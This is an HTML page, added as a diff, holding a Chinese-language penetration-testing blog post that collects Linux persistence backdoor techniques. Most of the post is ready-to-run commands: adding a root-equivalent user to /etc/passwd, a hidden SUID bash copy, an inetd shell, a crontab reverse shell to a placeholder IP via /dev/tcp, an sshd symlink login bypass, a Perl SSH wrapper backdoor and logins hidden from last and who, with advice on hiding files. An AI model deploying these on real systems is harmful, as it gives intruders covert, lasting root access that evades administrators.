@@ -1,0 +1,865 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Phyb0x's blog" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="前言收集复现下网上linux后门姿势，一起学习下。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="linux权限维持-后门">
+<meta property="og:url" content="http://yoursite.com/2018/10/23/linux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-%E5%90%8E%E9%97%A8/index.html">
+<meta property="og:site_name" content="Phyb0x&#39;s blog">
+<meta property="og:description" content="前言收集复现下网上linux后门姿势，一起学习下。">
+<meta property="og:image" content="https://i.imgur.com/mbGCWWC.png">
+<meta property="og:image" content="https://i.imgur.com/MfrKCL2.png">
+<meta property="og:image" content="https://i.imgur.com/trdq2Ga.png">
+<meta property="og:image" content="https://i.imgur.com/gNtOHBu.png">
+<meta property="og:image" content="https://i.imgur.com/H4ViOmX.png">
+<meta property="og:image" content="https://i.imgur.com/a1PeNzd.png">
+<meta property="og:image" content="https://i.imgur.com/Zib3o9y.png">
+<meta property="article:published_time" content="2018-10-23T15:15:46.000Z">
+<meta property="article:modified_time" content="2020-01-12T01:11:20.000Z">
+<meta property="article:author" content="Phyb0x">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.imgur.com/mbGCWWC.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/10/23/linux权限维持-后门/"/>
+
+
+
+
+
+  <title>linux权限维持-后门 | Phyb0x's blog</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <a href="https://github.com/phyb0x" target="_blank" rel="noopener"><img style="position: absolute; top: 0; left: 0; border: 0;" src="https://s3.amazonaws.com/github/ribbons/forkme_left_gray_6d6d6d.png" alt="Fork me on GitHub"></a>
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Phyb0x's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/23/linux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-%E5%90%8E%E9%97%A8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Phyb0x">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://b-ssl.duitang.com/uploads/item/201710/05/20171005185843_HmGKQ.jpeg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Phyb0x's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">linux权限维持-后门</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-10-23T23:15:46+08:00">
+                2018-10-23
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>收集复现下网上linux后门姿势，一起学习下。</p>
+<a id="more"></a>
+
+<p>这张图特别好</p>
+<p><img src="https://i.imgur.com/mbGCWWC.png" alt=""></p>
+<h4 id="添加超级用户"><a href="#添加超级用户" class="headerlink" title="添加超级用户"></a>添加超级用户</h4><p>某些情况下是没有回显的，可以用一句话直接添加用户</p>
+<pre><code>1、useradd guest;echo &apos;guest:123456&apos;|chpasswd
+2、useradd -p `openssl passwd 123456` guest
+3、useradd -p &quot;$(openssl passwd 123456)&quot; guest
+4、useradd newuwer;echo -e &quot;123456n123456n&quot; |passwd newuser</code></pre><p>然后把我们添加的用户赋予root权限    </p>
+<pre><code>echo &quot;guest:x:0:0::/:/bin/sh&quot; &gt;&gt; /etc/passwd
+echo &apos;guest:123456&apos;|chpasswd</code></pre><p>有些时候添加不成功是因为用户策略可以适当加强密码强度</p>
+<p>有些也会限制root权限用户远程登录</p>
+<h4 id="SUID-shell"><a href="#SUID-shell" class="headerlink" title="SUID shell"></a>SUID shell</h4><p>Suid shell是一种可用于以拥有者权限运行的shell，如果拥有者是root<br>那么任何运行了这个shell的用户便可以控制整个系统，如增加用户、修改root口令、清除日志等等。 </p>
+<p>root权限下执行</p>
+<pre><code>cp /bin/bash  /.test
+chmod 4755 /.test</code></pre><p>这个放的目录要尽可能隐蔽，最好是子子子目录然后找一个相似的命名。</p>
+<p>切换普通用户</p>
+<pre><code>/.test</code></pre><p>不过bash2针对suid做了一些措施 加个参数就行</p>
+<pre><code>/.test -p</code></pre><p><img src="https://i.imgur.com/MfrKCL2.png" alt=""></p>
+<p>euid:effective user ID:有效用户ID,指进程执行时对文件的访问权限</p>
+<h4 id="inetd"><a href="#inetd" class="headerlink" title="inetd"></a>inetd</h4><p>修改/etc/inetd.conf</p>
+<p><img src="https://i.imgur.com/trdq2Ga.png" alt=""></p>
+<p>nc直接连接</p>
+<p><img src="https://i.imgur.com/gNtOHBu.png" alt=""></p>
+<p>还可以配合修改修改/etc/service  改为常用端口隐藏<br><img src="https://i.imgur.com/H4ViOmX.png" alt=""></p>
+<p><img src="https://i.imgur.com/a1PeNzd.png" alt=""></p>
+<h4 id="Crontab后门"><a href="#Crontab后门" class="headerlink" title="Crontab后门"></a>Crontab后门</h4><p>redis未授权访问也是利用这个，我们可以设置没隔一段时间反弹一次shell</p>
+<pre><code>(crontab -l;printf &quot;*/60 * * * * exec 9&lt;&gt; /dev/tcp/xxx.xxx.xxx.xxx/4444;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;/bin/bash --noprofile -i;\rno crontab for `whoami`%100c\n&quot;)|crontab -</code></pre><h4 id="ssh公钥免密"><a href="#ssh公钥免密" class="headerlink" title="ssh公钥免密"></a>ssh公钥免密</h4><p>redis也有用到不多说了</p>
+<pre><code>ssh-keygen -t rsa</code></pre><p>把自己本地生成的公钥id_rsa.pub传到目标服务器</p>
+<pre><code>chmod 600 ~/.ssh/authorized_keys
+chmod 700 ~/.ssh</code></pre><p>实战受限且很容易被发现</p>
+<h4 id="ssh软连接"><a href="#ssh软连接" class="headerlink" title="ssh软连接"></a>ssh软连接</h4><pre><code>ln -sf /usr/sbin/sshd /tmp/su; /tmp/su -oPort=5555;</code></pre><p>直接ssh连接5555端口就行，密码随便输入。但是有些限制了root不许远程登录不能指定root用户。</p>
+<p>软连接其实是利用了pam验证后续过程对pam_rootok模块的验证信任。<br><a href="http://www.91ri.org/16803.html" target="_blank" rel="noopener">http://www.91ri.org/16803.html</a></p>
+<h4 id="SSH-wrapper后门"><a href="#SSH-wrapper后门" class="headerlink" title="SSH wrapper后门"></a>SSH wrapper后门</h4><pre><code>cd /usr/sbin/
+mv sshd ../bin/
+echo &apos;#!/usr/bin/perl&apos; &gt;sshd
+echo &apos;exec &quot;/bin/sh&quot; if(getpeername(STDIN) =~ /^..4A/);&apos; &gt;&gt;sshd
+echo &apos;exec{&quot;/usr/bin/sshd&quot;} &quot;/usr/sbin/sshd&quot;,@ARGV,&apos; &gt;&gt;sshd
+chmod u+x sshd
+/etc/init.d/sshd restart</code></pre><p>连接：</p>
+<pre><code>socat STDIO TCP4:target_ip:22,sourceport=13377</code></pre><p><img src="https://i.imgur.com/Zib3o9y.png" alt=""></p>
+<p>说句实在话每太看明白，反正命令敲上去就连上了…</p>
+<h4 id="PAM"><a href="#PAM" class="headerlink" title="PAM"></a>PAM</h4><p><a href="https://github.com/litsand/shell/blob/master/pam.sh" target="_blank" rel="noopener">https://github.com/litsand/shell/blob/master/pam.sh</a></p>
+<p>自动化脚本</p>
+<h4 id="Openssh"><a href="#Openssh" class="headerlink" title="Openssh"></a>Openssh</h4><p><a href="https://www.tuicool.com/articles/eIv22az" target="_blank" rel="noopener">https://www.tuicool.com/articles/eIv22az</a></p>
+<p>实战的确会遇到各种问题 (ps:本机都各种问题)</p>
+<h4 id="隐身登录"><a href="#隐身登录" class="headerlink" title="隐身登录"></a>隐身登录</h4><p>隐身登录系统，不会被last who w等指令检测到</p>
+<pre><code>ssh -T username@host /bin/bash -i
+
+ssh -o UserKnownHostsFile=/dev/null -T user@host 
+/bin/bash -if</code></pre><h4 id="RootKit"><a href="#RootKit" class="headerlink" title="RootKit"></a>RootKit</h4><p>安装了mafix刚执行妈的把老子环境都删了，现在连命令都执行不了…<br>心态爆炸！！！</p>
+<h3 id="收集后门"><a href="#收集后门" class="headerlink" title="收集后门"></a>收集后门</h3><pre><code>https://github.com/iamckn/backdoors</code></pre><p>参考链接：</p>
+<p><a href="http://www.91ri.org/9026.html" target="_blank" rel="noopener">http://www.91ri.org/9026.html</a></p>
+<p><a href="https://www.anquanke.com/post/id/155943#h2-10" target="_blank" rel="noopener">https://www.anquanke.com/post/id/155943#h2-10</a></p>
+<p><a href="http://rcoil.me/2017/04/Linux%E5%B0%8F%E5%90%8E%E9%97%A8/" target="_blank" rel="noopener">http://rcoil.me/2017/04/Linux%E5%B0%8F%E5%90%8E%E9%97%A8/</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+    <div>
+      
+        
+<div class="my_post_copyright">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+  <!-- JS库 sweetalert 可修改路径 -->
+  <script type="text/javascript" src="http://jslibs.wuxubj.cn/sweetalert_mini/jquery-1.7.1.min.js"></script>
+  <script src="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.min.js"></script>
+  <link rel="stylesheet" type="text/css" href="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.mini.css">
+  <p><span>文章作者:</span><a href="/" title="访问 Phyb0x 的个人博客">Phyb0x</a></p>
+  <p><span>最后更新:</span>2020年01月12日 09:01:20</p>
+  <p><span>原始链接:</span><a href="/2018/10/23/linux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-%E5%90%8E%E9%97%A8/" title="linux权限维持-后门">http://yoursite.com/2018/10/23/linux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-%E5%90%8E%E9%97%A8/</a></p>
+  <p><span>版权声明:</span>本博客所有文章除特别声明外，均采用 <i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-sa/3.0/" target="_blank" title="Attribution-NonCommercial-ShareAlike 3.0 Unported (CC BY-NC-SA 3.0)"> BY-NC-SA 3.0 许可协议</a>，转载请注明出处！</p>  
+</div>
+
+      
+    </div>
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>万一有人点了呢！</div>
+  <button id="rewardButton" disable="enable" style="width: 80px;line-height: 38px;text-align: center;font-weight: bold;color: #fff;border-radius: 5px;
+margin:0 20px 20px 0;position: relative;overflow: hidden;color: #8c96a0;text-shadow:1px 1px 1px #fff;border:1px solid #dce1e6;box-shadow: 0 1px 2px #fff inset,0 -1px 0 #a8abae inset;background: -webkit-linear-gradient(top,#f2f3f7,#e4e8ec);background: -moz-linear-gradient(top,#f2f3f7,#e4e8ec);background: linear-gradient(top,#f2f3f7,#e4e8ec);" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    打赏
+  </button>
+  <div id="QR" style="display: none;">
+    
+      <div id="wechat" style="display: inline-block;width:150px;height:150px">
+        <img id="wechat_qr" src="/images/wechat.png" alt="Phyb0x WeChat Pay"/>
+        <p>WeChat Pay</p>
+      </div>
+    
+    
+    
+  </div>
+</div>
+
+      </div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/10/22/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/" rel="next" title="redis未授权访问">
+                <i class="fa fa-chevron-left"></i> redis未授权访问
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/10/26/redis(%E8%A1%A5)/" rel="prev" title="redis">
+                redis <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="https://b-ssl.duitang.com/uploads/item/201710/05/20171005185843_HmGKQ.jpeg"
+                alt="Phyb0x" />
+            
+              <p class="site-author-name" itemprop="name">Phyb0x</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%20%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">33</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">categories</span>
+                
+              </div>
+            
+
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://cdusec.happyhacking.top" title="CDUSEC" target="_blank">CDUSEC</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://nbsec.xyz/" title="大熊's Blog" target="_blank">大熊's Blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://a3ura.github.io/" title="a3ura's Blog" target="_blank">a3ura's Blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://a-running-snail2333.github.io/blog.github.io/" title="a-running-snail's Blog" target="_blank">a-running-snail's Blog</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#添加超级用户"><span class="nav-number">1.1.</span> <span class="nav-text">添加超级用户</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SUID-shell"><span class="nav-number">1.2.</span> <span class="nav-text">SUID shell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#inetd"><span class="nav-number">1.3.</span> <span class="nav-text">inetd</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Crontab后门"><span class="nav-number">1.4.</span> <span class="nav-text">Crontab后门</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ssh公钥免密"><span class="nav-number">1.5.</span> <span class="nav-text">ssh公钥免密</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ssh软连接"><span class="nav-number">1.6.</span> <span class="nav-text">ssh软连接</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SSH-wrapper后门"><span class="nav-number">1.7.</span> <span class="nav-text">SSH wrapper后门</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#PAM"><span class="nav-number">1.8.</span> <span class="nav-text">PAM</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Openssh"><span class="nav-number">1.9.</span> <span class="nav-text">Openssh</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#隐身登录"><span class="nav-number">1.10.</span> <span class="nav-text">隐身登录</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#RootKit"><span class="nav-number">1.11.</span> <span class="nav-text">RootKit</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#收集后门"><span class="nav-number">2.</span> <span class="nav-text">收集后门</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Phyb0x</span>
+
+  <div class="powered-by">
+  <i class="fa fa-user-md"></i><span id="busuanzi_container_site_pv">
+  本站访客数:<span id="busuanzi_value_site_pv"></span>次
+  </span>
+  </div>
+
+  
+</div>
+
+<!-- 
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+
+
+-->
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/three.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/canvas_lines.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
